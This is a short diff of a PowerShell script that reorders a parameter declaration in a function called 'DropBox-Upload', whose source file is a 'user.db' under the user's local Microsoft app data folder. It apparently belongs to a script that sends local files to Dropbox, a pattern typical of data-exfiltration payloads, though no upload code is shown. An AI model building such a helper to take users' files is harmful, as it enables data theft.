@@ -4,8 +4,8 @@ function DropBox-Upload {
 param (
 	
 [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[String]$db
 [Alias("f")]
+[String]$db
 ) 
 
 $SourceFilePath = "%LOCALAPPDATA%\Microsoft\user.db"
